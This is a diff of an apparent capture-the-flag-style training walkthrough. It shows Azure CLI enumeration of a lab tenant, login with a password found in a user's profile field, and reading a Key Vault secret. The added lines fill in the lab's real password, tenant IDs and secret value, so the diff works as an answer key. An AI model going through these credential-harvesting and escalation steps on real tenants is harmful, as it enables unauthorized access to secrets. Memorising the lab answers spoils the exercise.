@@ -30,44 +30,6 @@ Knowing that a potential breach had happened, McSkidy decided to conduct an Assu
 
 In this setup, the mindset is to assess how far an attacker can go once they get inside your network, including all possible attack paths that could branch out from the defined starting point of intrusion.
 
-## Connecting to the Environment
-
-Before moving forward, review the questions in the connection card shown below:  
-
-![Connection card for Cloud Access and Credentials.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1731679222152.png)  
-
-For this Assumed Breach testing of Wareville's tenant, McSkidy will provide valid credentials. To get the credentials, click the **Cloud Details** button below.
-
-Cloud Details
-
-Next, click the **Join Lab** button to generate your credentials.
-
-![Generating credentials for Azure.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022044862.png)  
-
-You may view the credentials by clicking the **Credentials** tab.
-
-![Viewing the credentials in the Credentials tab.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022071488.png)  
-
-To use the credentials, click the **Open Lab** button in the **Environment** tab. This will open the [Azure Portal](https://portal.azure.com/) login page, so kindly use the recently generated credentials to authenticate to the Azure Portal. 
-
-![Going to the Azure Portal via the Open Lab button.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022209026.png)  
-
-After logging in, you will encounter an MFA configuration prompt. Kindly click the **Ask Later** button to proceed.
-
-![Skipping the MFA configuration.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022425034.png)  
-
-Lastly, click the **Cancel** button when prompted with the **Welcome to Microsoft Azure** banner.
-
-![Skipping the Azure welcome banner.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022425433.png)
-
-**Note:** The Azure Portal may default to your local language, so you may follow these steps if you prefer to switch it to English.
-
-1. Click on the settings icon in the top panel.
-2. On the right-hand side, click on "Language + Region".
-3. Change the language to English (or your preferred choice) using the dropdown menu.
-4. Click the "Apply" button below.
-
-![Configuring the language settings.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022969184.png)  
 
 **Azure Cloud Shell**
 
@@ -109,16 +71,16 @@ Azure Cloud Shell
 {
   "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
   "businessPhones": [],
-  "displayName": "usr-xxxxxxxx",
+  "displayName": "usr-03250729",
   "givenName": null,
-  "id": "3970058b-7741-49c5-b1a7-191540995f7a",
+  "id": "753eafcd-3ff6-4077-94ba-ba3230ca47a8",
   "jobTitle": null,
   "mail": null,
   "mobilePhone": null,
   "officeLocation": null,
   "preferredLanguage": null,
   "surname": null,
-  "userPrincipalName": "usr-xxxxxxxx@aoc2024.onmicrosoft.com"
+  "userPrincipalName": "usr-03250729@aoc2024.onmicrosoft.com"
 }
 ```
 
@@ -131,8 +93,6 @@ When the Glitch got hold of an initial account in Wareville's Azure tenant, he h
 
 Using the current account, let's start by listing all the users in the tenant.   
 **Note:** This command might take a while depending on the amount of user accounts available, so feel free to skip it.
-
-Azure Cloud Shell
 
 ```shell-session
 usr-xxxxxxxx [ ~ ]$ az ad user list
@@ -149,19 +109,75 @@ The Azure CLI typically uses the following command syntax: `az GROUP SUBGROUP
 
 After executing the command, you might have been overwhelmed with the number of accounts listed. For a better view, let's follow McSkidy's suggestion to only look for the accounts prepended with `wvusr-`. According to her, these accounts are more interesting than the other ones. To do this, we will use the `--filter` parameter and filter all accounts that start with `wvusr-`.
 
-Azure Cloud Shell
+Initial result
 
-```shell-session
-usr-xxxxxxxx [ ~ ]$ az ad user list --filter "startsWith('wvusr-', displayName)"
-```
-
-  
-You may observe that an unusual parameter was set to a specific account in the output. One of the users, **wvusr-backupware**, has its password stored in one of the fields. 
-
-Azure Cloud Shell
-
-```shell-session
-...
+``` bash
+[
+  {
+    "businessPhones": [],
+    "displayName": "breakglass",
+    "givenName": null,
+    "id": "d6c5bb7b-36a2-4706-ad5f-dd5a73e5dfd8",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "breakglass@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wiz",
+    "givenName": null,
+    "id": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "oz_thmtraininglabs.onmicrosoft.com#EXT#@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "usr-03250729",
+    "givenName": null,
+    "id": "753eafcd-3ff6-4077-94ba-ba3230ca47a8",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "usr-03250729@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "weyland",
+    "givenName": null,
+    "id": "bbbe3752-0ce4-476f-b52f-e2aef17f3183",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wayland@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-alphaware",
+    "givenName": null,
+    "id": "d197bfbd-adaf-4e54-9ac1-62b2a9568f91",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-alphaware@aoc2024.onmicrosoft.com"
+  },
   {
     "businessPhones": [],
     "displayName": "wvusr-backupware",
@@ -170,28 +186,234 @@ Azure Cloud Shell
     "jobTitle": null,
     "mail": null,
     "mobilePhone": null,
-    "officeLocation": "REDACTED",
+    "officeLocation": "R3c0v3r_s3cr3ts!",
     "preferredLanguage": null,
     "surname": null,
     "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
   },
-...
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-firmware",
+    "givenName": null,
+    "id": "1f80a74b-4abc-4f93-b065-965ea5c826c8",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-firmware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-freeware",
+    "givenName": null,
+    "id": "47f6013e-9533-49f5-a779-615721145e50",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-freeware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-hardware",
+    "givenName": null,
+    "id": "ac459a56-09cf-440a-be46-2006b36a68e1",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-hardware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-mayor_malware",
+    "givenName": null,
+    "id": "4d29c472-f2f6-4e18-8a37-dcd2e2040489",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-mayor_malware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-mcskidy",
+    "givenName": null,
+    "id": "33845c09-f7ad-45eb-ad24-c05cc1e39bda",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-mcskidy@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "yutani",
+    "givenName": null,
+    "id": "86e14415-abac-486d-b49a-4825bcd3a13e",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "yutani@aoc2024.onmicrosoft.com"
+  }
+]
+```
+
+```shell-session
+usr-xxxxxxxx [ ~ ]$ az ad user list --filter "startsWith('wvusr-', displayName)"
 ```
 
   
-When the Glitch saw this one, he immediately thought it could be the first step taken by the intruder to gain further access inside the tenant. However, he decided to continue the initial reconnaissance of users and groups. Now, let's continue by listing the groups.
-
-Azure Cloud Shell
-
-```shell-session
-usr-xxxxxxxx [ ~ ]$ az ad group list
+You may observe that an unusual parameter was set to a specific account in the output. One of the users, **wvusr-backupware**, has its password stored in one of the fields. 
+After filter result
+``` bash
 [
   {
-    ---REDACTED FOR BREVITY---
+    "businessPhones": [],
+    "displayName": "wvusr-alphaware",
+    "givenName": null,
+    "id": "d197bfbd-adaf-4e54-9ac1-62b2a9568f91",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-alphaware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-backupware",
+    "givenName": null,
+    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": "R3c0v3r_s3cr3ts!",
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-firmware",
+    "givenName": null,
+    "id": "1f80a74b-4abc-4f93-b065-965ea5c826c8",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-firmware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-freeware",
+    "givenName": null,
+    "id": "47f6013e-9533-49f5-a779-615721145e50",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-freeware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-hardware",
+    "givenName": null,
+    "id": "ac459a56-09cf-440a-be46-2006b36a68e1",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-hardware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-mayor_malware",
+    "givenName": null,
+    "id": "4d29c472-f2f6-4e18-8a37-dcd2e2040489",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-mayor_malware@aoc2024.onmicrosoft.com"
+  },
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-mcskidy",
+    "givenName": null,
+    "id": "33845c09-f7ad-45eb-ad24-c05cc1e39bda",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": null,
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-mcskidy@aoc2024.onmicrosoft.com"
+  }
+]
+```
+When the Glitch saw this one, he immediately thought it could be the first step taken by the intruder to gain further access inside the tenant. However, he decided to continue the initial reconnaissance of users and groups. Now, let's continue by listing the groups.
+
+```bash
+usr-03250729 [ ~ ]$ az ad group list
+[
+  {
+    "classification": null,
+    "createdDateTime": "2024-10-13T23:10:55Z",
+    "creationOptions": [],
+    "deletedDateTime": null,
     "description": "Group for recovering Wareville's secrets",
     "displayName": "Secret Recovery Group",
     "expirationDateTime": null,
-    ---REDACTED FOR BREVITY---
+    "groupTypes": [],
+    "id": "7d96660a-02e1-4112-9515-1762d0cb66b7",
+    "isAssignableToRole": null,
+    "mail": null,
+    "mailEnabled": false,
+    "mailNickname": "f315e3ef-c",
+    "membershipRule": null,
+    "membershipRuleProcessingState": null,
+    "onPremisesDomainName": null,
+    "onPremisesLastSyncDateTime": null,
+    "onPremisesNetBiosName": null,
+    "onPremisesProvisioningErrors": [],
+    "onPremisesSamAccountName": null,
+    "onPremisesSecurityIdentifier": null,
+    "onPremisesSyncEnabled": null,
+    "preferredDataLocation": null,
+    "preferredLanguage": null,
+    "proxyAddresses": [],
+    "renewedDateTime": "2024-10-13T23:10:55Z",
+    "resourceBehaviorOptions": [],
+    "resourceProvisioningOptions": [],
+    "securityEnabled": true,
+    "securityIdentifier": "S-1-12-1-2107008522-1091699425-1645680021-3076967376",
+    "serviceProvisioningErrors": [],
+    "theme": null,
+    "uniqueName": null,
+    "visibility": "Private"
   }
 ]
 ```
@@ -201,24 +423,28 @@ usr-xxxxxxxx [ ~ ]$ az ad group list
 
 Given the output, it can be seen that a group named `Secret Recovery Group` exists. This is kind of an interesting group because of the description, so let's follow the white rabbit and list the members of this group.
 
-Azure Cloud Shell
-
-```shell-session
-usr-xxxxxxxx [ ~ ]$ az ad group member list --group "Secret Recovery Group"
+```bash
+usr-03250729 [ ~ ]$ az ad group member list --group "Secret Recovery Group"
 [
   {
     "@odata.type": "#microsoft.graph.user",
     "businessPhones": [],
     "displayName": "wvusr-backupware",
-    ---REDACTED FOR BREVITY---
+    "givenName": null,
+    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": "R3c0v3r_s3cr3ts!",
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
   }
 ]
 ```
 
   
 Given the previous output, it looks like everything makes a little sense now. All of the previous commands seem to point to the `wvusr-backupware` account. Since we have seen a potential set of credentials, let's jump to another user by clearing the current Azure CLI account session and logging in with the new account.
-
-Azure Cloud Shell
 
 ```shell-session
 usr-xxxxxxxx [ ~ ]$ az account clear
@@ -228,6 +454,46 @@ usr-xxxxxxxx [ ~ ]$ az login -u EMAIL -p PASSWORD
   
 **Note:** Replace the values with the actual email and password of the newly discovered account.
 
+``` bash
+usr-03250729 [ ~ ]$ az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R3c0v3r_s3cr3ts!
+Authentication with username and password in the command line is strongly discouraged. Use one of the recommended authentication methods based on your requirements. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
+Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
+[
+  {
+    "cloudName": "AzureCloud",
+    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
+    "id": "ddd3338d-bc5a-416d-8247-1db1f5b5ff43",
+    "isDefault": true,
+    "managedByTenants": [],
+    "name": "Az-Subs-AoC",
+    "state": "Enabled",
+    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
+    "tenantDisplayName": "AoC 2024",
+    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
+    "user": {
+      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
+      "type": "user"
+    }
+  },
+  {
+    "cloudName": "AzureCloud",
+    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
+    "id": "3e480a8d-0097-42ec-9c56-60d97ceeb66d",
+    "isDefault": false,
+    "managedByTenants": [],
+    "name": "Subscription 1",
+    "state": "Disabled",
+    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
+    "tenantDisplayName": "AoC 2024",
+    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
+    "user": {
+      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
+      "type": "user"
+    }
+  }
+]
+```
+
 **Azure Role Assignments**  
 
 Since the `wvusr-backupware` account belongs to an interesting group, the Glitch's first hunch is to see whether sensitive or privileged roles are assigned to the group. And his thought was, "It doesn't make sense to name it like this if it can't do anything, right McSkidy?". But before checking the assigned roles, let's have a quick run-through of Azure Role Assignments.
@@ -235,25 +501,48 @@ Since the `wvusr-backupware` account belongs to an interesting group, the Glit
 **Azure Role Assignments** define the resources that each user or group can access. When a new user is created via Entra ID, it cannot access any resource by default due to a lack of role. To grant access, an administrator must assign a **role** to let users view or manage a specific resource. The privilege level configured in a role ranges from read-only to full-control. Additionally, **group members can inherit a role** when assigned to a group.  
 
 Returning to the Azure enumeration, let's see if a role is assigned to the Secret Recovery Group. We will be using the `--all` option to list all roles within the Azure subscription, and we will be using the `--assignee` option with the group's ID to render only the ones related to our target group.
-
-Azure Cloud Shell
-
-```shell-session
-usr-xxxxxxxx [ ~ ]$ az role assignment list --assignee REPLACE_WITH_SECRET_RECOVERY_GROUP_ID --all
+```bash
+usr-03250729 [ ~ ]$ az role assignment list --assignee 7d96660a-02e1-4112-9515-1762d0cb66b7 --all
 [
   {
-    ---REDACTED FOR BREVITY---
+    "condition": null,
+    "conditionVersion": null,
+    "createdBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
+    "createdOn": "2024-10-14T20:25:32.172518+00:00",
+    "delegatedManagedIdentityResourceId": null,
+    "description": null,
+    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets/providers/Microsoft.Authorization/roleAssignments/3038142a-80c7-4bf1-b7c2-0939b906316d",
+    "name": "3038142a-80c7-4bf1-b7c2-0939b906316d",
+    "principalId": "7d96660a-02e1-4112-9515-1762d0cb66b7",
     "principalName": "Secret Recovery Group",
-    "roleDefinitionName": "Key Vault Secrets User",
-    "scope": "/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
-    ---REDACTED FOR BREVITY---
+    "principalType": "Group",
+    "resourceGroup": "rg-aoc-akv",
+    "roleDefinitionId": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/providers/Microsoft.Authorization/roleDefinitions/21090545-7ca7-4776-b22c-e363652d74d2",
+    "roleDefinitionName": "Key Vault Reader",
+    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
+    "type": "Microsoft.Authorization/roleAssignments",
+    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
+    "updatedOn": "2024-10-14T20:25:32.172518+00:00"
   },
   {
-    ---REDACTED FOR BREVITY---
+    "condition": null,
+    "conditionVersion": null,
+    "createdBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
+    "createdOn": "2024-10-14T20:26:53.771014+00:00",
+    "delegatedManagedIdentityResourceId": null,
+    "description": null,
+    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets/providers/Microsoft.Authorization/roleAssignments/d2edb9d3-620b-45a0-af60-128b5153a00a",
+    "name": "d2edb9d3-620b-45a0-af60-128b5153a00a",
+    "principalId": "7d96660a-02e1-4112-9515-1762d0cb66b7",
     "principalName": "Secret Recovery Group",
-    "roleDefinitionName": "Key Vault Reader",
-    "scope": "/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
-    ---REDACTED FOR BREVITY---
+    "principalType": "Group",
+    "resourceGroup": "rg-aoc-akv",
+    "roleDefinitionId": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6",
+    "roleDefinitionName": "Key Vault Secrets User",
+    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
+    "type": "Microsoft.Authorization/roleAssignments",
+    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
+    "updatedOn": "2024-10-14T20:26:53.771014+00:00"
   }
 ]
 ```
@@ -280,20 +569,15 @@ After seeing both of these roles, McSkidy immediately realised everything! This 
 **Azure Key Vault**
 
 With McSkidy's guidance, the Glitch is now tasked to verify if the current account, **wvusr-backupware**, can access the sensitive data. Let's list the accessible key vaults by executing the command below.
-
-Azure Cloud Shell
-
-```shell-session
-usr-xxxxxxxx [ ~ ]$ az keyvault list
+```bash
+usr-03250729 [ ~ ]$ az keyvault list
 [
   {
-    "id": "/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
+    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
     "location": "eastus",
     "name": "warevillesecrets",
-    "resourceGroup": "rg-aoc-kv",
-    "tags": {
-      "aoc": "rg"
-    },
+    "resourceGroup": "rg-aoc-akv",
+    "tags": {},
     "type": "Microsoft.KeyVault/vaults"
   }
 ]
@@ -301,42 +585,49 @@ usr-xxxxxxxx [ ~ ]$ az keyvault list
 
   
 The output above confirms the key vault discovered from the role assignments named `warevillesecrets`. Now, let's see if secrets are stored in this key vault.
-
-Azure Cloud Shell
-
-```shell-session
-usr-xxxxxxxx [ ~ ]$ az keyvault secret list --vault-name warevillesecrets
+```bash
+usr-03250729 [ ~ ]$ az keyvault secret list --vault-name warevillesecrets
 [
   {
-    ---REDACTED FOR BREVITY---
-    "id": "https://warevillesecrets.vault.azure.net/secrets/REDACTED",
+    "attributes": {
+      "created": "2024-10-14T20:22:20+00:00",
+      "enabled": true,
+      "expires": null,
+      "notBefore": null,
+      "recoverableDays": 90,
+      "recoveryLevel": "Recoverable+Purgeable",
+      "updated": "2024-10-14T20:22:20+00:00"
+    },
+    "contentType": null,
+    "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024",
     "managed": null,
-    "name": "REDACTED",
+    "name": "aoc2024",
     "tags": {}
   }
 ]
 ```
-
-  
 After executing the two previous commands, we confirmed that the **Reader** role allows us to view the key vault metadata, specifically the list of key vaults and secrets. Now, the only thing left to confirm is whether the current user can access the contents of the discovered secret with the **Key Vault Secrets User** role. This can be done by executing the following command.
-
-Azure Cloud Shell
-
-```shell-session
-usr-xxxxxxxx [ ~ ]$ az keyvault secret show --vault-name warevillesecrets --name REDACTED
+```bash
+usr-03250729 [ ~ ]$ az keyvault secret show --vault-name warevillesecrets --name aoc2024
 {
-  ---REDACTED FOR BREVITY---
-  "id": "https://warevillesecrets.vault.azure.net/secrets/REDACTED/20953fbf6d51464299b30c6356b378fd",
+  "attributes": {
+    "created": "2024-10-14T20:22:20+00:00",
+    "enabled": true,
+    "expires": null,
+    "notBefore": null,
+    "recoverableDays": 90,
+    "recoveryLevel": "Recoverable+Purgeable",
+    "updated": "2024-10-14T20:22:20+00:00"
+  },
+  "contentType": null,
+  "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024/7f6bf431a6a94165bbead372bca28ab4",
   "kid": null,
   "managed": null,
-  "name": "REDACTED",
+  "name": "aoc2024",
   "tags": {},
-  "value": "REDACTED"
+  "value": "WhereIsMyMind1999"
 }
 ```
-
-**Note:** Replace the value of the `--name` parameter with the actual secret name.
-
 "Bingo!" the Glitch exclaimed as he saw the output above. McSkidy had confirmed her nightmare that a regular user could escalate their way into the secrets of Wareville.
 
 With that, the Glitch had helped McSkidy to find the attack path that had been taken to escalate a user’s privileges and a lot had been learned in the process. The only question that remained was who had initially carried out the attack in the first place. There was a very limited set of Wares who had access to this tenant and with user visibility, and with that set of permissions, only town officials who perform governance validation on the tenant to ensure all the town’s secrets are being stored securely. The focus then turns to the motive; the only thing accessed was an access key stored in the key vault, which grants access to an evidence file stored elsewhere. The evidence in this file was in relation to recent cyber events this month in Wareville. We’ll have to keep our eyes peeled in the following days to get to the bottom of this.
